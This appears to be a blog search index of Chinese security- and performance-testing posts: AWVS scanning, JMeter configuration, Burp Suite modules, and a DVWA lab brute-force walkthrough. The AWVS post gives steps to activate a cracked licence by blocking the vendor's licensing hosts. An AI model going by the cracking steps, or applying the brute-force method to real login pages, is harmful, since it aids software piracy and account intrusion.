<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AWVS实践</title>
    <url>/aposts/66cae209/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>AWVS是最强的扫描web漏洞之一了</li>
<li>本次的版本为14.6</li>
<li>安装环境：win10</li>
</ul>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul>
<li><p>安装主要是参考<a href="https://www.ddosi.org/awvs-14-6/">这里</a>，不过我把一些关键步骤记录下</p>
</li>
<li><p>下载AWVS的<a href="https://download.yzzpan.com/download/65055/zFm7sV6m/acunetix_14.6.211213163.exe_www.ddosi.org.rar">win安装包</a>，解压密码为：<code>www.ddosi.org</code></p>
</li>
<li><p>下载<a href="https://download.yzzpan.com/download/65055/zFm7sV6m/acunetix_14.6.211213163.exe_www.ddosi.org.rar">激活工具</a>，解压密码同上</p>
</li>
<li><p>安装AWVS后，在浏览器登录后出现如下页面，表示未激活</p>
</li>
</ul>
<p><img src="/aposts/66cae209/image-20220302094957721.png" alt="image-20220302094957721"></p>
<ul>
<li>把激活文件（license_info.json，wa_data.dat）复制并到AWVS安装目录（<code>E:\app\Acunetix\data\shared\license</code>）下替换</li>
</ul>
<p><img src="/aposts/66cae209/image-20220302101024287.png" alt="image-20220302101024287"></p>
<ul>
<li>到如下目录对hosts文件进行修改</li>
</ul>
<p><img src="/aposts/66cae209/image-20220302101458504.png" alt="image-20220302101458504"></p>
<ul>
<li>在hosts最后加上如下两行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 updates.acunetix.com</span><br><span class="line">127.0.0.1 erp.acunetix.com</span><br></pre></td></tr></table></figure>

<ul>
<li>刷新页面后，成功激活</li>
</ul>
<p><img src="/aposts/66cae209/image-20220302102129057.png" alt="image-20220302102129057"></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="靶场testfire-net"><a href="#靶场testfire-net" class="headerlink" title="靶场testfire.net"></a>靶场testfire.net</h3><p>填入目标网站，开始扫描，填入ibm提供的在线靶场：<code>http://testfire.net/</code></p>
<p><img src="/aposts/66cae209/image-20220302102720203.png" alt="image-20220302102720203"></p>
<p><img src="/aposts/66cae209/image-20220302104105251.png" alt="image-20220302104105251"></p>
<p>点击扫描</p>
<p><img src="/aposts/66cae209/image-20220302104204101.png" alt="image-20220302104204101"></p>
<ul>
<li>扫描选项中，扫描时间默认为马上扫描</li>
</ul>
<p><img src="/aposts/66cae209/image-20220302104239644.png" alt="image-20220302104239644"></p>
<ul>
<li>等待扫描中</li>
</ul>
<p><img src="/aposts/66cae209/image-20220302104516343.png" alt="image-20220302104516343"></p>
<ul>
<li>扫描完成了，差不多用了25分钟扫描完毕，发现高危漏洞有7个</li>
</ul>
<p><img src="/aposts/66cae209/image-20220302111052346.png" alt="image-20220302111052346"></p>
<ul>
<li>导出测试报告，比较清晰说明了攻击方式和结果，比如这个跨脚本攻击</li>
</ul>
<p><img src="/aposts/66cae209/image-20220302111833044.png" alt="image-20220302111833044"></p>
<ul>
<li><strong>经过手动验证发现，css漏洞，全部都是误报</strong>，其他的懒得验证了、</li>
</ul>
<h3 id="靶场dvwa"><a href="#靶场dvwa" class="headerlink" title="靶场dvwa"></a>靶场dvwa</h3><h4 id="设置靶场"><a href="#设置靶场" class="headerlink" title="设置靶场"></a>设置靶场</h4><ul>
<li><p>这个是我之前搭建的<a href="/aposts/97835086/">dwva靶场</a>，首先修改下配置</p>
</li>
<li><p>修改apache的端口，默认端口已经被使用了</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> vi /etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">Listen 8001</span><br></pre></td></tr></table></figure>

<ul>
<li>dwva把安全等级默认修改为low</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/var/www/html/DVWA-2.0.1/config</span><br><span class="line">[root@VM-24-13-centos config]# vi config.inc.php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_DVWA[ <span class="string">&#x27;default_security_level&#x27;</span> ] = <span class="string">&#x27;low&#x27;</span>;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>防火墙打开8001，腾讯云服务器的端口开放规则需要单独设置下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=8001/tcp --permane</span><br><span class="line">[root@VM-24-13-centos config]# systemctl restart firewalld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启httpd服务</span></span><br><span class="line">[root@VM-24-13-centos config]# systemctl start httpd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看端口已经启动</span></span><br><span class="line">[root@VM-24-13-centos config]# firewall-cmd --list-ports</span><br><span class="line">3306/tcp 8080/tcp 4444/tcp 7777/tcp 80/tcp 8081/tcp 8001/tcp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="启动AWVS"><a href="#启动AWVS" class="headerlink" title="启动AWVS"></a>启动AWVS</h4><ul>
<li>AWVS新增目标，注意不填入login</li>
</ul>
<p><img src="/aposts/66cae209/image-20220302150203374.png" alt="image-20220302150203374"></p>
<p><img src="/aposts/66cae209/image-20220302150355672.png" alt="image-20220302150355672"></p>
<p><img src="/aposts/66cae209/image-20220302150502002.png" alt="image-20220302150502002"></p>
<ul>
<li>点击下一步，右侧输入被排除的url，这些url都有一些敏感信息，需求提前屏蔽掉</li>
</ul>
<p><img src="/aposts/66cae209/image-20220302151311220.png" alt="image-20220302151311220"></p>
<ul>
<li>具体排除的url如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET http://ip:8001/DVWA-2.0.1/login.php HTTP/1.1</span><br><span class="line">GET http://ip.101:8001/DVWA-2.0.1/security.php HTTP/1.1</span><br><span class="line">GET http://ip:8001/DVWA-2.0.1/phpinfo.php HTTP/1.1</span><br><span class="line">GET http://ip:8001/DVWA-2.0.1/setup.php HTTP/1.1</span><br><span class="line">GET http://ip:8001/DVWA-2.0.1/instructions.php HTTP/1.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>点击下一步，点击完成</p>
<p><img src="/aposts/66cae209/image-20220302151827818.png" alt="image-20220302151827818"></p>
<ul>
<li>点击扫描</li>
</ul>
<p><img src="/aposts/66cae209/image-20220302152233313.png" alt="image-20220302152233313"></p>
<p><img src="/aposts/66cae209/image-20220302152250630.png" alt="image-20220302152250630"></p>
<ul>
<li>15分钟左右扫描完毕，高危漏洞有16个</li>
</ul>
<p><img src="/aposts/66cae209/image-20220302154037208.png" alt="image-20220302154037208"></p>
<h4 id="分析测试报告"><a href="#分析测试报告" class="headerlink" title="分析测试报告"></a>分析测试报告</h4><p>生成下载测试报告后，手动验证下，扫描发现这个bak文件，的确全都是一些敏感信息</p>
<p><img src="/aposts/66cae209/image-20220302154221690.png" alt="image-20220302154221690"></p>
<ul>
<li>这个是跨站攻击，手动验证下发现这个也是误报的</li>
</ul>
<p><img src="/aposts/66cae209/image-20220302154532447.png" alt="image-20220302154532447"></p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><ul>
<li><p>AWVS操作简单，对各种web漏洞进行检测非常强大</p>
</li>
<li><p>虽然有很多是误报的，不过误报总比漏报好</p>
</li>
</ul>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>AWVS</tag>
      </tags>
  </entry>
  <entry>
    <title>Badboy录制后jmeter无法运行</title>
    <url>/aposts/78359967/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>jmeter version 5.4.1</li>
<li>Badboy录制了三个步骤<ul>
<li>登录</li>
<li>打开用户列表</li>
<li>新增用户</li>
</ul>
</li>
</ul>
<p>​          <img src="/aposts/78359967/image-20211009150357237.png"></p>
<h2 id="问题点"><a href="#问题点" class="headerlink" title="问题点"></a>问题点</h2><ul>
<li>Badboy录制后的脚本给jmeter打开，直接是无法运行的，需要做如下配置</li>
</ul>
<h3 id="设置jmeter代理"><a href="#设置jmeter代理" class="headerlink" title="设置jmeter代理"></a>设置jmeter代理</h3><p><img src="/aposts/78359967/image-20211009150800398.png" alt="image-20211009150800398"></p>
<ul>
<li>设置代理后，登录接口出错，发现传参应该为json但是传的是</li>
</ul>
<p><img src="/aposts/78359967/image-20211009153859635.png" alt="image-20211009153859635"></p>
<ul>
<li><p>改为放到body data中放json</p>
<p><img src="/aposts/78359967/image-20211009154035718.png" alt="image-20211009154035718"></p>
</li>
<li><p>设置代理后，登录接口抱错，抓包登录接口发现是header的Accept设置错误，设置加了个<code>applicaiton/json</code></p>
<p><img src="/aposts/78359967/image-20211009151254512.png" alt="image-20211009151254512"></p>
<h3 id="登录后的设置"><a href="#登录后的设置" class="headerlink" title="登录后的设置"></a>登录后的设置</h3></li>
<li><p>再次回放，登录成功了，但是登录后的其他接口一直返回403，因为所有接口的头部加了<code>Authorization </code>验证，在登录接口设置<strong>后置处理器</strong>的<strong>json提取器</strong></p>
</li>
<li><p>查看登录接口返回的数据</p>
<p><img src="/aposts/78359967/image-20211009151904817.png" alt="image-20211009151904817"></p>
</li>
<li><p>新建<strong>后置处理器</strong>的<strong>json提取器</strong></p>
<p><img src="/aposts/78359967/image-20211009152109721.png" alt="image-20211009152109721"></p>
</li>
<li><p>设置提取<code>Authorization</code>的值</p>
<p><img src="/aposts/78359967/image-20211009152223210.png" alt="image-20211009152223210"></p>
</li>
<li><p>HTTP Header设置请求参数</p>
<p><img src="/aposts/78359967/image-20211009152326586.png" alt="image-20211009152326586"></p>
</li>
</ul>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><ul>
<li><p>最终回放成功</p>
<p><img src="/aposts/78359967/image-20211009152629801.png" alt="image-20211009152629801"></p>
</li>
</ul>
<h2 id="修正"><a href="#修正" class="headerlink" title="修正"></a>修正</h2><ul>
<li>2021年10月28日，无法回放和jmeter设置的代理无关，设置代理后可以直接用来录制，后续会有笔记对这个进行说明</li>
</ul>
]]></content>
      <categories>
        <category>jmeter</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Concurrency Thread Group实例</title>
    <url>/aposts/cb7ef82f/</url>
    <content><![CDATA[<h2 id="Concurrency-Thread-Group的介绍"><a href="#Concurrency-Thread-Group的介绍" class="headerlink" title="Concurrency Thread Group的介绍"></a>Concurrency Thread Group的介绍</h2><ul>
<li>Concurrency Thread Group提供了用于配置多个线程计划的简化方法</li>
<li>该线程组目的是为了保持并发水平，意味着如果并发线程不够，则在运行线程中启动额外的线程</li>
<li>和Standard Thread Group不同，它不会预先创建所有线程，因此不会使用额外的内存</li>
<li>对于上篇讲到的Stepping Thread Group来说，Concurrency Thread Group是个更好的选择，因为它允许线程优雅地完成其工作</li>
<li>Concurrency Thread Group提供了更好的用户行为模拟，因为它使您可以更轻松地控制测试的时间，并创建替换线程以防线程在过程中完成</li>
</ul>
<h2 id="Concurrency-Thread-Group参数讲解"><a href="#Concurrency-Thread-Group参数讲解" class="headerlink" title="Concurrency Thread Group参数讲解"></a>Concurrency Thread Group参数讲解</h2><p><img src="/aposts/cb7ef82f/image-20211109151532330.png" alt="image-20211109151532330"></p>
<ul>
<li><strong>Target Concurrency</strong>：目标并发（线程数），我设置为40</li>
<li><strong>Ramp Up Time</strong>：启动时间；若设置 1 min，则目标线程在1 imn内全部启动</li>
<li><strong>Ramp-Up Steps Count</strong>：阶梯次数；若设置 5 ，则目标线程在 1min 内分5次阶梯加压（启动线程）；<strong>每次启动的线程数</strong> &#x3D; 目标线程数 &#x2F; 阶梯次数 &#x3D; 40 &#x2F; 5 &#x3D; 8</li>
<li><strong>Hold Target Rate Time</strong>：持续负载运行时间；若设置 2 ，则启动完所有线程后，持续负载运行 2 min，然后再结束</li>
<li><strong>Time Unit</strong>：时间单位（分钟或者秒）</li>
<li><strong>Thread Iterations Limit：</strong>线程迭代次数限制（循环次数）；默认为空，理解成永远，如果<strong>运行时间到达</strong>Ramp Up Time + Hold Target Rate Time，则停止运行线程<strong>【不建议设置该值】</strong></li>
<li><strong>Log Threads Status into File：</strong>将线程状态记录到文件中（将线程启动和线程停止事件保存为日志文件）；</li>
</ul>
<h4 id="特别注意点"><a href="#特别注意点" class="headerlink" title="特别注意点"></a>特别注意点</h4><ul>
<li>Target Concurrency只是个<strong>期望值</strong>，实际不一定可以达到这个并发数，得看上面的配置<strong>【电脑性能、网络、内存、CPU等因素都会影响最终并发线程数】</strong></li>
<li>Jmeter会根据Target Concurrency的值和当前处于<strong>活动状态的线程数</strong>来判断当前并发线程数是否达到了Target Concurrency；若没有，则会不断启动线程，尽力让并发线程数达到Target Concurrency的值</li>
</ul>
<h2 id="Concurrency-Thread-Group和Stepping-Thread-Group的区别"><a href="#Concurrency-Thread-Group和Stepping-Thread-Group的区别" class="headerlink" title="Concurrency Thread Group和Stepping Thread Group的区别"></a>Concurrency Thread Group和Stepping Thread Group的区别</h2><h4 id="官方说法"><a href="#官方说法" class="headerlink" title="官方说法"></a>官方说法</h4><ul>
<li>Stepping Thread Group不提供设置启动延迟时间，阶梯增压过渡时间，阶梯释放过渡时间，但Concurrency Thread Group提供</li>
<li>Stepping Thread Group可以<strong>阶梯释放线程</strong>，而Concurrency Thread Group是<strong>瞬时释放</strong>（具体看下面介绍）</li>
<li>Stepping Thread Group设置了需要启动多少个线程就会<strong>严格执行</strong>，Concurrency Thread Group会<strong>尽力启动线程达到</strong>Target Concurrency值</li>
</ul>
<h4 id="通俗点理解"><a href="#通俗点理解" class="headerlink" title="通俗点理解"></a>通俗点理解</h4><ul>
<li>Stepping Thread Group 是手动场景：测试过程，按照设定好的步骤执行</li>
<li>Concurrency Thread Group 是目标场景：达到某个目标运行场景，测试过程不可控，动态变化</li>
</ul>
<h4 id="类比-LR"><a href="#类比-LR" class="headerlink" title="类比 LR"></a>类比 LR</h4><ul>
<li>Stepping Thread Group ：设置并发用户数，持续时间等，每隔多少时间自动增加多少个用户</li>
<li>Concurrency Thread Group：预设一个目标并发数，每隔一段时间增加一部分并发数，直到 TPS 达到目标并发数，然后持续运行一段时间</li>
</ul>
<h2 id="Concurrency-Thread-Group-Active-Threads-Over-Time"><a href="#Concurrency-Thread-Group-Active-Threads-Over-Time" class="headerlink" title="Concurrency Thread Group + Active Threads Over Time"></a>Concurrency Thread Group + Active Threads Over Time</h2><p><img src="/aposts/cb7ef82f/image-20211109153859390.png" alt="image-20211109153859390"></p>
<h4 id="第一个关注点：阶梯增压过程"><a href="#第一个关注点：阶梯增压过程" class="headerlink" title="第一个关注点：阶梯增压过程"></a>第一个关注点：阶梯增压过程</h4><p>看Concurrency Thread Group负载预览图每次阶梯增压都是瞬时增压的，但是实际测试结果可以看到它也是有一个过渡期，并不是瞬时增压</p>
<h4 id="第二个关注点：持续负载运行结束后，所有线程瞬时释放"><a href="#第二个关注点：持续负载运行结束后，所有线程瞬时释放" class="headerlink" title="第二个关注点：持续负载运行结束后，所有线程瞬时释放"></a>第二个关注点：持续负载运行结束后，所有线程瞬时释放</h4><ul>
<li>从图最后可以看到，所有线程都是瞬时释放的</li>
<li>普通的线程组有三种状态：启动、运行、释放；而Concurrency Thread Group的线程可以理解成只有两种状态：启动、运行；因为线程都在极短的时间内就结束了</li>
</ul>
<h2 id="Concurrency-Thread-Group的扩展"><a href="#Concurrency-Thread-Group的扩展" class="headerlink" title="Concurrency Thread Group的扩展"></a>Concurrency Thread Group的扩展</h2><ul>
<li>当Concurrency Thread Group与Throughput Shaping Timer（吞吐量计时器）一起使用时，可以用tstFeedback 函数的调用来动态维护实现目标RPS所需的线程数</li>
<li>使用此方法时， 需要将Ramp Up Time 和 Ramp-Up Steps Count 置空</li>
<li>但要确保 Hold Target Rate Time ≥ Throughput Shaping Timer 时间表中指定的总持续时间值（Duration）</li>
</ul>
<p><strong>本文来自<a href="https://www.cnblogs.com/poloyy/p/12845465.html">这里</a>，强烈建议仔细学习此博主的jmeter系列文章</strong></p>
]]></content>
      <categories>
        <category>jmeter</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Burp-Suite常用模块介绍</title>
    <url>/aposts/857ead96/</url>
    <content><![CDATA[<h2 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h2><ul>
<li>代理模块，主要时拦截http&#x2F;https的请求，一些拦截端口，拦截请求（过滤）&#x2F;响应（替换）等设置都在这个模块</li>
</ul>
<p><img src="/aposts/857ead96/image-20220216171907221.png" alt="image-20220216171907221"></p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><img src="/aposts/857ead96/image-20220217104445168.png" alt="image-20220217104445168"></p>
<p>访问https时，需要ssl证书，比如访问csdn时，直接抓包就提示，本次主要时在浏览器中设置，如果在proxy中导入证书，参考<a href="https://www.cnblogs.com/JetpropelledSnake/p/8983676.html">这里</a></p>
<p><img src="/aposts/857ead96/image-20220217104539089.png" alt="image-20220217104539089"></p>
<ul>
<li>浏览器中输入：127.0.0.1:8080，点击右上角CA证书按钮</li>
</ul>
<p><img src="/aposts/857ead96/image-20220217104636496.png" alt="image-20220217104636496"></p>
<ul>
<li>谷歌浏览器-设置-搜索：证书</li>
</ul>
<p><img src="/aposts/857ead96/image-20220217105120882.png" alt="image-20220217105120882"></p>
<p><img src="/aposts/857ead96/image-20220217105158869.png" alt="image-20220217105158869"></p>
<p>导入刚刚下载的证书直到完成</p>
<p><img src="/aposts/857ead96/image-20220217105255589.png" alt="image-20220217105255589"></p>
<p>找到刚刚导入的证书，在中间证书颁发机构下面，点击导出</p>
<p><img src="/aposts/857ead96/image-20220217105746211.png" alt="image-20220217105746211"></p>
<p>选择base64</p>
<p><img src="/aposts/857ead96/image-20220217105856259.png" alt="image-20220217105856259"></p>
<p><img src="/aposts/857ead96/image-20220217110023738.png" alt="image-20220217110023738"></p>
<p>在证书机构中导入刚才的证书文件，并选择【<strong>信任使用此CA标识的网站</strong>】</p>
<p><img src="/aposts/857ead96/image-20220217110420952.png" alt="image-20220217110420952"></p>
<p><img src="/aposts/857ead96/image-20220217110202421.png" alt="image-20220217110202421"></p>
<p><img src="/aposts/857ead96/image-20220217110232399.png" alt="image-20220217110232399"></p>
<p><img src="/aposts/857ead96/image-20220217110312353.png" alt="image-20220217110312353"></p>
<p>重启下浏览器和burpsite</p>
<p><img src="/aposts/857ead96/image-20220217110720646.png" alt="image-20220217110720646"></p>
<h2 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h2><p>暴力破解模块，常用场景就算爆破登录密码，参考这里的<a href="https://moon-full.gitee.io/2022/01/27/DVWA%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97-Brute%20Force(%E7%88%86%E7%A0%B4)/">实例</a></p>
<p><img src="/aposts/857ead96/image-20220217094834492.png" alt="image-20220217094834492"></p>
<h2 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h2><p>重发请求，使用场景：拦截请求后，action发送到Repeater，打开Repeater然后点击发送，可以看到发送请求和响应数据</p>
<p><img src="/aposts/857ead96/image-20220217094807468.png" alt="image-20220217094807468"></p>
<h2 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h2><ul>
<li><p><strong>没有用过</strong></p>
</li>
<li><p>用于检测数据样本随机性质量的工具，通常用于检测访问令牌是否可预测、密码重置令牌是否可预测等场景，通过Sequencer不断发包，抓取对应的token值等等，对这些随机令牌的样本，进行数据分析，能很好地降低这些关键数据被伪造的风险</p>
</li>
<li><p>DVWA靶场中Weak Session IDs（弱会话），应该可以验证，有兴趣可以参考<a href="https://blog.csdn.net/m0_53008479/article/details/121707032">这里</a></p>
</li>
</ul>
<p><img src="/aposts/857ead96/image-20220217095231055.png" alt="image-20220217095231055"></p>
<h2 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h2><p>Decoder用于对字符串进行加密解密的操作，实际场景没有使用过</p>
<p><img src="/aposts/857ead96/image-20220217100107857.png" alt="image-20220217100107857"></p>
<h2 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h2><p>两个请求的对比，有兴趣的可以参考<a href="https://t0data.gitbooks.io/burpsuite/content/chapter12.html">这里</a></p>
<p><img src="/aposts/857ead96/image-20220217101604862.png" alt="image-20220217101604862"></p>
<h2 id="Extender"><a href="#Extender" class="headerlink" title="Extender"></a>Extender</h2><p>扩展模块，比如插件的使用就是这里，后续单独介绍此模块</p>
<p><img src="/aposts/857ead96/image-20220217101655976.png" alt="image-20220217101655976"></p>
<h2 id="Project-options"><a href="#Project-options" class="headerlink" title="Project options"></a>Project options</h2><p>项目选择的配置选项，一般都是保持默认，有兴趣可以参考<a href="https://blog.csdn.net/u011781521/article/details/54780748">这里介绍</a></p>
<p><img src="/aposts/857ead96/image-20220217101743166.png" alt="image-20220217101743166"></p>
<h2 id="User-options"><a href="#User-options" class="headerlink" title="User options"></a>User options</h2><p>用户选择的一些常用配置，一般都是保持默认，有兴趣可以查看<a href="https://blog.csdn.net/u011781521/article/details/54810413?locationNum=4&fps=1">这里介绍</a></p>
<p><img src="/aposts/857ead96/image-20220217102502735.png" alt="image-20220217102502735"></p>
<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏洞的过程，Target分为site map、scope、 issue definitions</p>
<p><img src="/aposts/857ead96/image-20220217112140164.png" alt="image-20220217112140164"></p>
<h3 id="site-map"><a href="#site-map" class="headerlink" title="site map"></a>site map</h3><p>所有被拦截的请求都在这里地图上展示，常见场景只查看csdn的请求：</p>
<ul>
<li>右击后，点击Add to scope</li>
</ul>
<p><img src="/aposts/857ead96/image-20220217112425549.png" alt="image-20220217112425549"></p>
<ul>
<li>打开scope查看到了刚刚添加的数据，就算白名单</li>
</ul>
<p><img src="/aposts/857ead96/image-20220217112741495.png" alt="image-20220217112741495"></p>
<ul>
<li>鼠标点击Site map的过滤文本框</li>
</ul>
<p><img src="/aposts/857ead96/image-20220217112838390.png" alt="image-20220217112838390"></p>
<ul>
<li>选择只展示scope中设置的条目</li>
</ul>
<p><img src="/aposts/857ead96/image-20220217112944233.png" alt="image-20220217112944233"></p>
<ul>
<li>最终点击re-enable按钮</li>
</ul>
<p><img src="/aposts/857ead96/image-20220217113037862.png" alt="image-20220217113037862"></p>
<p><img src="/aposts/857ead96/image-20220217113108637.png" alt="image-20220217113108637"></p>
<h3 id="issue-definitions"><a href="#issue-definitions" class="headerlink" title="issue definitions"></a>issue definitions</h3><p>用Scanner扫描可以检测出的漏洞列表</p>
<p><img src="/aposts/857ead96/image-20220217113326895.png" alt="image-20220217113326895"></p>
<h2 id="spider"><a href="#spider" class="headerlink" title="spider"></a>spider</h2><p>新版本的爬虫模块在这里，被隐藏了</p>
<p><img src="/aposts/857ead96/image-20220217114232491.png" alt="image-20220217114232491"></p>
<p><img src="/aposts/857ead96/image-20220217114735514.png" alt="image-20220217114735514"></p>
<p>可以看到爬虫后的一些文件</p>
<p><img src="/aposts/857ead96/image-20220217152106710.png" alt="image-20220217152106710"></p>
<h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>Burp Scanner的功能主要是用来自动检测web系统的各种漏洞，我们可以使用Burp Scanner代替我们手工去对系统进行普通漏洞类型的渗透测试，从而能使得我们把更多的精力放在那些必须要人工去验证的漏洞上。</p>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>点击New scan（主动扫描，旁边的New live task为被动扫描）</p>
<p><img src="/aposts/857ead96/image-20220217160808751.png" alt="image-20220217160808751"></p>
<p>输入需要扫描的地址</p>
<p><img src="/aposts/857ead96/image-20220217161152993.png" alt="image-20220217161152993"></p>
<p>填写登录的密码</p>
<p><img src="/aposts/857ead96/image-20220217161234808.png" alt="image-20220217161234808"></p>
<p>扫描中</p>
<p><img src="/aposts/857ead96/image-20220217161307661.png" alt="image-20220217161307661"></p>
<p>点击这可以看到一些扫描情况</p>
<p><img src="/aposts/857ead96/image-20220217161512590.png" alt="image-20220217161512590"></p>
<p>发现高危漏洞</p>
<p><img src="/aposts/857ead96/image-20220217164419703.png" alt="image-20220217164419703"></p>
<p>明文传输密码</p>
<p><img src="/aposts/857ead96/image-20220217164510106.png" alt="image-20220217164510106"></p>
<p>导出报告</p>
<p><img src="/aposts/857ead96/image-20220217164617231.png" alt="image-20220217164617231"></p>
<p><img src="/aposts/857ead96/image-20220217164645942.png" alt="image-20220217164645942"></p>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>Burp Site</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA通关指南-Brute Force(爆破)</title>
    <url>/aposts/b7636e10/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li><p><a href="https://moon-full.gitee.io/2022/01/25/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83DVWA%E7%9A%84%E6%90%AD%E5%BB%BA/">上文</a>服务器已经搭建好了DVWA环境，本篇开始介绍对DVWA的使用</p>
</li>
<li><p>Bruce Force(爆破)。密码破解是从计算机系统中存储或传输的数据中还原出密码的过程，一种常见的方法是反复尝试猜测密码，直到把正确的密码试出来。用户往往会设置弱密码，不安全选择的例子包括字典中的单字、姓氏、任何太短的密码（通常被认为少于6或7个字符）或可预测的模式（例如，交替的元音和辅音，称为 leetspeak，因此 “password” 变成了 p@55w0rd”)。</p>
<p><img src="/aposts/b7636e10/image-20220127145156521.png" alt="image-20220127145156521"></p>
</li>
</ul>
<h2 id="安全等级LOW"><a href="#安全等级LOW" class="headerlink" title="安全等级LOW"></a>安全等级LOW</h2><p>把安全等级调整为：LOW。开发人员完全忽视了任何保护方法，允许任何人尝试多次任意访问，可以在没有任何影响的情况下对任意用户进行登录。</p>
<p><img src="/aposts/b7636e10/image-20220127145338823.png" alt="image-20220127145338823"></p>
<h3 id="源代码审计"><a href="#源代码审计" class="headerlink" title="源代码审计"></a>源代码审计</h3><ul>
<li>点击查看源码</li>
</ul>
<p><img src="/aposts/b7636e10/image-20220127145613479.png" alt="image-20220127145613479"></p>
<ul>
<li>分析。源码如下，代码将获取用户输入的用户名和密码并将其进行 md5 加密，然后使用 SQL SELECT 语句进行查询。由于进行了 md5 加密，因此直接阻止了 SQL 注入，因为经过 md5 这种摘要算法之后 SQL 语句就会被破坏(不过这里用 SQL 注入可以登陆成功)。注意到此时服务器只是使用了 isset() 函数验证了参数 Login 是否被设置，参数 username、password 没有做任何过滤，更重要的是没有任何的防爆破机制。</li>
</ul>
<p><img src="/aposts/b7636e10/image-20220127145759588.png" alt="image-20220127145759588"></p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><h4 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h4><ul>
<li><p>Burp Suite Pro 2020.4_v2.5.0.2（有需要，可以联系我）</p>
<ul>
<li>依赖java9，可以从这里<a href="https://www.oracle.com/java/technologies/javase/javase9-archive-downloads.html">下载安装</a>，设置好环境变量</li>
</ul>
</li>
<li><p>设置Burp 代理</p>
</li>
</ul>
<p><img src="/aposts/b7636e10/image-20220127151952103.png" alt="image-20220127151952103"></p>
<ul>
<li>chrome浏览器设置代理</li>
</ul>
<p><img src="/aposts/b7636e10/image-20220127152139068.png" alt="image-20220127152139068"></p>
<h4 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h4><p>在Brute Force中，用户名输入admin，密码输入1123（错误的密码），正确的密码是password，点击登录被Burp 拦截</p>
<p><img src="/aposts/b7636e10/image-20220127152224491.png" alt="image-20220127152224491"></p>
<p><img src="/aposts/b7636e10/image-20220127152346413.png" alt="image-20220127152346413"></p>
<p>把拦截的请求发送到测试器</p>
<p><img src="/aposts/b7636e10/image-20220127152650009.png" alt="image-20220127152650009"></p>
<p>在测试器点击清楚</p>
<p><img src="/aposts/b7636e10/image-20220127153846031.png" alt="image-20220127153846031"></p>
<p>选择密码，点击添加</p>
<p><img src="/aposts/b7636e10/image-20220127153928769.png" alt="image-20220127153928769"></p>
<p>点击Palyloads，载入自定义的密码字典</p>
<p><img src="/aposts/b7636e10/image-20220127155906579.png" alt="image-20220127155906579"></p>
<p>设置下线程数，开始攻击</p>
<p><img src="/aposts/b7636e10/image-20220127163807548.png" alt="image-20220127163807548"></p>
<p>查看测试结果，有一个长度不一样的，点进去看下</p>
<p><img src="/aposts/b7636e10/image-20220127163854226.png" alt="image-20220127163854226"></p>
<p>登录成功了</p>
<p><img src="/aposts/b7636e10/image-20220127163956037.png" alt="image-20220127163956037"></p>
<h2 id="安全等级Medium"><a href="#安全等级Medium" class="headerlink" title="安全等级Medium"></a>安全等级Medium</h2><p>此阶段在验证失败的登录屏幕上添加睡眠，这意味着当您登录不正确时，在页面可见之前将有额外的两秒钟等待。这只会减慢一分钟内可处理的请求量，使暴力攻击的时间更长。</p>
<p><img src="/aposts/b7636e10/image-20220127171112317.png" alt="image-20220127171112317"></p>
